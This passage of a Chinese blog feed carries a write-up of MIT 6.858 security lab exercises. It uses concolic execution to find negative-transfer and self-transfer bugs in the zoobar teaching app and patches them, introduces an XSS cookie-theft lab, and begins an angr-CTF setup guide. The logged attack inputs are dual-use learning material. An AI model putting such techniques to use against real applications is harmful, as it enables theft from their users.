 pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>在 <code>zoobar/zoodb.py</code> 中定义了 Person 数据库，其中 balance（也就是 zoobars 字段）的初始值为 10，同时主键为 <code>username</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>在该文件中还定义了 Transfer 数据库，应当用以表示单次交易的双方及数值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是，我们可以遍历 Person 数据库以获得所有用户的用户名集合，接下来遍历 Transfer 数据库来将用户名集合中的非 sender 给剔除（因为我们主要关注 recipient 发生了 balance 缩小的情况），最后检查剩余用户是否存在 balance 小于初始值的情况，若是则说明存在漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>成功通过 Exercise 9：</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>最后是 Exercise 10，修复 balance mismatch 和 zoobar theft 这两个漏洞（Lab 已经替我们修好了 eval injection 的漏洞），需要注意的是这里评测系统要求将存在问题的源码文件拷贝到 <code>zoobar-fixed</code> 下再进行修复，：</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>./check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>那么我们首先要找到漏洞出现的位置，笔者最初的思路是在两个找到漏洞的 report 函数进行约束求解就可以获得造成问题的输入，但是<strong>这个做法并不可行，因为本 Lab 提供的混合执行框架是高度封装好的</strong>，在 <code>concolic_execs()</code> 的执行过程中我们是没办法中途停下来进行约束求解的</p><blockquote><p>笔者思考了半天怎么改才能在 <code>test_stuff()</code> 的两个 report() 函数进行约束求解来得到触发漏洞的输入，后面发现基本没啥可行性，实在要弄的话需要对整个框架进行大改，故就此作罢改换思路…</p></blockquote><p>我们重新思考一个问题：  <em>Lab 3 为什么提供的是混合执行框架而非纯符号执行或是纯具体执行呢？</em></p><p>正如前文所言，concolic execution 的诞生便是为了解决 symbolic execution 与 concrete execution 所分别存在的问题，融合两者的特性来达到一个更好的效果</p><p>现在让我们重新审视 <code>concolic_execs()</code> 的执行流程：</p><ul><li>由一个外层大循环不断迭代<ul><li>从输入队列中取出具体值字典</li><li>调用 <code>concolic_exec_input()</code> 执行目标函数，获取到返回值、分支条件列表、分支调用方列表</li><li>将得到的新的返回值添加至 <code>outs</code> 集合</li><li>内层小循环遍历分支条件列表<ul><li>调用 <code>concolic_force_branch()</code> 获取将当前分支条件逆转后的约束条件</li><li>若该约束不在 <code>checked</code> （已验证约束集合）中，添加，并调用 <code>concolic_find_input()</code> 进行约束求解</li><li>约束可解，将结果添加到下一次作为输入的具体值字典中</li></ul></li></ul></li></ul><p>我们不难得知的是，当 <code>test_stuff()</code> 报告漏洞时，<strong>说明我们的 concolic execution system 给出了一个能够触发漏洞的 concrete input</strong></p><p>我们可以使用如下语句来将输出重定向至当前目录下的 <code>typescript</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>前面我们用到的两个 report() 函数实际上就只是 <code>print()</code> 而已，我们只需要在输出结果中搜索对应的字符串即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_balance_mismatch</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Balance mismatch detected&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">report_zoobar_theft</span>():<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Zoobar theft detected&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是两个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;-10&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1689</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Balance mismatch detected</span><br><span class="hljs-string">Trying concrete value: &#123;&#x27;</span>form_recipient_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_present<span class="hljs-string">&#x27;: 1, &#x27;</span>form_zoobars_val<span class="hljs-string">&#x27;: &#x27;</span>-<span class="hljs-number">10</span><span class="hljs-string">&#x27;, &#x27;</span>rsplit_split_cookie_=_r_<span class="hljs-comment">#_r&#x27;: &#x27;atok&#x27;, &#x27;rsplit_split_cookie_=_r_#_l&#x27;: &#x27;alice&#x27;, &#x27;split_cookie_=_r&#x27;: &#x27;alice#atok&#x27;, &#x27;split_cookie_=_l&#x27;: &#x27;PyZoobarLogin&#x27;, &#x27;cookie&#x27;: &#x27;PyZoobarLogin=alice#atok&#x27;, &#x27;path&#x27;: &#x27;fer&#x27;, &#x27;form_recipient_val&#x27;: &#x27;bob&#x27;, &#x27;referrer&#x27;: &#x27;&#x27;&#125;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1686</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;link rel=&quot;stylesheet&quot; type=&quot;tex...</span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br><span class="hljs-string">WARNING: Zoobar theft detected</span><br></code></pre></td></tr></table></figure><p>参数的含义不难辨认，<code>form_zoobars_val</code> 为单次 transfer 的数值，<code>cookie</code> 表示发送方用户名及 cookie，<code>form_recipient_val</code> 表示接收方用户名，那么这里我们可以推断出至少可能存在两个漏洞：</p><ul><li>未对负数的 transfer 进行过滤，导致一个用户可以盗取另一用户的 balance</li><li>未对 self-transfer 的情况做合适处理，导致最后总的 balance 不一致</li></ul><p>但这个时候我们只知道  <em>漏洞是存在的</em>  ，而不知道  <em>漏洞在何处</em>  ，那这里我们需要再审一审日志别的地方，我们不难发现会有一些抛异常的日志：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Trying concrete value: &#123;<span class="hljs-string">&#x27;form_recipient_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;form_zoobars_present&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_r&#x27;</span>: <span class="hljs-string">&#x27;atok&#x27;</span>, <span class="hljs-string">&#x27;rsplit_split_cookie_=_r_#_l&#x27;</span>: <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_r&#x27;</span>: <span class="hljs-string">&#x27;alice#atok&#x27;</span>, <span class="hljs-string">&#x27;split_cookie_=_l&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin&#x27;</span>, <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;PyZoobarLogin=alice#atok&#x27;</span>, <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;fer&#x27;</span>, <span class="hljs-string">&#x27;form_zoobars_val&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;referrer&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;form_recipient_val&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/transfer.py&quot;</span>, line <span class="hljs-number">16</span>, <span class="hljs-keyword">in</span> transfer<br>    bank.transfer(g.user.person.username,<br>  File <span class="hljs-string">&quot;/home/student/lab/zoobar/bank.py&quot;</span>, line <span class="hljs-number">12</span>, <span class="hljs-keyword">in</span> transfer<br>    recipient_balance = recipientp.zoobars + zoobars<br>AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;zoobars&#x27;</span><br>Response: <span class="hljs-number">200</span> OK<br>  Content-<span class="hljs-type">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>  Content-Length: <span class="hljs-number">1683</span><br>  X-XSS-Protection: <span class="hljs-number">0</span><br><span class="hljs-string">b&#x27;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n       </span><br><span class="hljs-string"># response，比较长且无意义，这里暂且省略</span><br></code></pre></td></tr></table></figure><p>说明主要的处理逻辑应当是在 <code>zoobar/bank.py</code> 中的 <code>transfer()</code> 函数，接下来就是代码审计+修复环节了，该函数的核心逻辑主要就是开头这一段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    persondb = person_setup()<br>    senderp = persondb.query(Person).get(sender)<br>    recipientp = persondb.query(Person).get(recipient)<br><br>    sender_balance = senderp.zoobars - zoobars<br>    recipient_balance = recipientp.zoobars + zoobars<br><br>    <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError()<br><br>    senderp.zoobars = sender_balance<br>    recipientp.zoobars = recipient_balance<br>    persondb.commit()<br><br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>可以看出：</p><ul><li>缺失了对 transfer 数量为负的检查</li><li>重复赋值导致对 self-transfer 的情况计算错误</li></ul><p>修改的办法其实比较简单，由于 username 为主键，故若 <code>sender == recipient</code>，直接跳过转账操作即可，同时对 transfer 数量为负数的情况直接转为 0 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">sender, recipient, zoobars</span>):<br>    <span class="hljs-comment"># for zoobars &lt; 0, convert it to 0</span><br>    <span class="hljs-keyword">if</span> zoobars &lt; <span class="hljs-number">0</span>:<br>        zoobars = <span class="hljs-number">0</span><br>    <br>    <span class="hljs-comment"># if self-transfer, we don&#x27;t need to do anything</span><br>    <span class="hljs-keyword">if</span> sender != recipient:<br>        persondb = person_setup()<br>        senderp = persondb.query(Person).get(sender)<br>        recipientp = persondb.query(Person).get(recipient)<br><br>        sender_balance = senderp.zoobars - zoobars<br>        recipient_balance = recipientp.zoobars + zoobars<br><br>        <span class="hljs-keyword">if</span> sender_balance &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> recipient_balance &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError()<br><br>        senderp.zoobars = sender_balance<br>        recipientp.zoobars = recipient_balance<br>        persondb.commit()<br>    <br>    <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>运行，成功通过所有检查</p><p><img src="https://s2.loli.net/2022/12/25/GYVItmEXyuZCUfo.png" alt="image.png"></p><p>至此，Lab 3 全部完成</p><h1>0x04.Lab 4: Browser security（uncompleted）</h1><h2 id="Introduction-3">Introduction</h2><p>本 Lab 主要带大家做基于浏览器的攻击（browser-based attacks，其实就是 web 手玩的那一套），包括：</p><ul><li>Part 1：跨站脚本攻击（cross-site scripting attack，XSS）</li><li>Part 2：侧信道与钓鱼攻击（side channel and phishing attack）</li><li>Part 3：一个简单的蠕虫（a profile worm）</li></ul><h2 id="Network-setup">Network setup</h2><p>因为我们需要在 web 浏览器构造攻击，为了保证评分系统正常，我们的 zoobar web 服务器必须要在 <code>http://localhost:8080/</code> 上进行访问</p><p><s>如果你是使用 KVM 或 VirtualBox，自己回去翻实验手册</s>；如果你使用 VMWare，我们将通过 ssh 进行端口转发</p><p>首先找到你的虚拟机的 IP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip addr show dev eth0</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/25/COioRUJdS81apIG.png" alt="image.png"></p><p>对于 Mac 和 Linux 用户，在宿主机上运行以下命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -L localhost:8080:localhost:8080 student@VM-IP-ADDRESS</span><br>student@VM-IP-ADDRESS&#x27;s password: 6858<br></code></pre></td></tr></table></figure><p>对于 Windows 用户，<s>没救了等死吧</s>，如果你用的是 PuTTY，可以根据这些  <a href="https://web.archive.org/web/20140811071925/http://www.cs.uu.nl/technical/services/ssh/putty/puttyfw.html">instructions</a> 完成设置，<s>如果你用的是 OpenSSH 那就等死吧</s></p><h2 id="Web-browser">Web browser</h2><p>本 Lab 推荐使用  <a href="https://www.mozilla.com/firefox/">Mozilla Firefox</a> ， <s>说是 Firefox 可以在许多种OS 上跑但👴寻思 Chrome 不照样能而且应用范围不知道比 Firefox 多多少了</s> ，若开启了 ad-blocking 等插件则需要将其关闭</p><h2 id="Setting-up-the-web-server">Setting up the web server</h2><p>首先还是按惯例保存 Lab 3 的答案，切到 Lab 4 分支，make 一下检查有没有问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~$ cd lab<br>student@vm-6858:~/lab$ git commit -am &#x27;my solution to lab3&#x27;<br>[lab3 c54dd4d] my solution to lab3<br> 1 files changed, 1 insertions(+), 0 deletions(-)<br>student@vm-6858:~/lab$ git pull<br>Already up-to-date.<br>student@vm-6858:~/lab$ git checkout -b lab4 origin/lab4<br>Branch lab4 set up to track remote branch lab4 from origin.<br>Switched to a new branch &#x27;lab4&#x27;<br>student@vm-6858:~/lab$ make<br>...<br></code></pre></td></tr></table></figure><p>然后按惯例用下面的语句在 8080 端口跑 zookd：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">student@vm-6858:~/lab$ ./zookd 8080<br></code></pre></td></tr></table></figure><p>然后在  <code>http://localhost:8080/</code> 就可以看到我们的 Zoobar 页面<s>还是一如既往的老样子</s></p><p><img src="https://s2.loli.net/2022/12/25/dU7ZvOKPLX4mzs9.png" alt="image.png"></p><h2 id="Crafting-attacks">Crafting attacks</h2><p>本 Lab 中我们将用不同的攻击手段来攻击 zoobar，评测系统将在清空注册用户数据库（除了 <code>&quot;attacker&quot;</code> 用户）后运行我们的攻击脚本，与前面的 Lab 类似的是我们同样可以通过 <code>make check</code> 来进行检查，需要注意的是该检查并不够彻底（尤其是对于条件竞争而言），我们可能需要多运行几次来确认攻击成功</p><p>对于 Exercise 5、13、14 与 challenge 而言，<code>make check</code> 脚本不足以看出站点在攻击前后的区别，因此这需要我们自行完成对比（MIT 的老师也会手动完成评测， <s>他真的👴哭死</s> ）；<code>make check</code> 在运行时会在 <code>lab4-tests/</code> 下生成攻击页面应有的外观的图片（<code>answer-XX.ref.png</code>）与我们的攻击页面的实际的样子（<code>answer-XX.png</code>），我们应当要确保两者应当一致</p><h2 id="Part-1-a-cross-site-scripting-XSS-attack">Part 1: a cross-site scripting (XSS) attack</h2><p>zoobar 的用户界面有一个能从登入用户的浏览器窃取其 cookie 的漏洞（若攻击者能诱导用户点击一个精心构造的连接），我们的工作便是构造这样一个链接</p><p>需求的前置知识：Javascript，DOM 等</p><p>接下来是 Exercise 1，在  <code>answer-1.js</code> 中编写攻击脚本打印出用户的 cookie，本地测试的话就保留一份 <code>zoobar/templates/users.html</code> 的拷贝并添加  <code>&lt;script&gt;</code>  标签来引入攻击脚本：</p><blockquote><p><strong>Exercise 1: Print cookie.</strong></p><p>Cookies are HTTP’s main mechanism for tracking users across requests. If an attacker can get ahold of another user’s cookie, they can completely impersonate that other user. For this exercise, your goal is simply to print the cookie of the currently logged-in user when they access the “Users” page.</p><ol><li><p>Read about how <a href="https://developer.mozilla.org/en-US/docs/Web/API/document.cookie">cookies are accessed from Javascript</a>.</p></li><li><p>Save a copy of <code>zoobar/templates/users.html</code> (you’ll need to restore this original version later). Add a <code>&lt;script&gt;</code> tag to <code>users.html</code> that prints the logged-in user’s cookie using <code>alert()</code></p><p>Your script might not work immediately if you made a Javascript programming error. Fortunately, Chrome has fantastic debugging tools accessible in the Inspector: the JavaScript console, the DOM inspector, and the Network monitor. The JavaScript console lets you see which exceptions are being thrown and why. The DOM Inspector lets you peek at the structure of the page and the properties and methods of each node it contains. The Network monitor allows you to inspect the requests going between your browser and the website. By clicking on one of the requests, you can see what cookie your browser is sending, and compare it to what your script prints.</p></li><li><p>Put the contents of your script in a file named <code>answer-1.js</code>. Your file should only contain javascript (don’t include <code>&lt;script&gt;</code> tags).</p></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如买个 CTF 课&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ret2libc" scheme="http://blog.arttnba3.cn/tags/ret2libc/"/>
    
    <category term="栈溢出" scheme="http://blog.arttnba3.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="符号执行" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="ret2shellcode" scheme="http://blog.arttnba3.cn/tags/ret2shellcode/"/>
    
    <category term="实验笔记" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="Concolic Execution" scheme="http://blog.arttnba3.cn/tags/Concolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法</title>
    <link href="http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/"/>
    <id>http://blog.arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</id>
    <published>2022-11-23T18:48:35.000Z</published>
    <updated>2022-12-02T18:23:54.271Z</updated>
    
    <content type="html"><![CDATA[<p>你说的对，但是 <a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制分析框架…</p><span id="more"></span><h1>0x00.一切开始之前</h1><p><a href="https://github.com/angr/angr">angr</a> 是一个使用 Python 编写的跨平台开源二进制<strong>混合</strong>（Concolic）分析框架，为我们提供了一系列实用的二进制分析工具，更多关于 angr 的介绍信息可以看他们的 <a href="https://angr.io">官网</a> ，关于 angr 提供的 API 则可以查看<a href="https://api.angr.io/">文档</a></p><p><a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a> 是一个非常好的入门级 angr 练手项目，刚好笔者最近在学 angr 相关的东西，所以决定从这个项目开始入门</p><h2 id="PRE-安装-angr-及相关组件">PRE.安装 angr 及相关组件</h2><p>首先是一些依赖项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-multilib</span><br></code></pre></td></tr></table></figure><p>angr 本体安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr</span><br></code></pre></td></tr></table></figure><p>然后是 <a href="https://github.com/angr/angrop">angrop</a>，可以自动收集 ROP gadget 以及构建 ROP chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angrop</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/patcherex">patcherex</a> 也是 angr 团队开发的，用以进行自动化的二进制加固</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install nasm clang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install clang-10 gcc-avr binutils-avr avr-libc</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/angr/patcherex.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> patcherex</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install -e .</span><br></code></pre></td></tr></table></figure><blockquote><p>阿里云源好像妹有 <code>compilerex</code> 这个依赖项，反正最后👴也妹安装上，难受</p></blockquote><p><a href="https://github.com/angr/rex">rex</a> 则是 angr 团队开发的自动 exp 生成器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">👴妹安成，看看就好</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/angr/angr-management">angr-management</a> 则是图形化的 angr 界面，安好之后直接在终端输入 <code>angr-management</code> 即可直接启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pip3 install angr-management</span><br></code></pre></td></tr></table></figure><h2 id="PRE2-angr-ctf-基本食用指北">PRE2. angr-ctf 基本食用指北</h2><p>首先把项目拉到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br></code></pre></td></tr></table></figure><p>之后进入到你想做的题目目录下使用脚本进行编译，比如说 <code>00_angr_find</code>，这里需要我们手动指定一个种子以及输出的文件名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> 00_angr_find/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">python3 generate.py</span> <br>Usage: ./generate.py [seed] 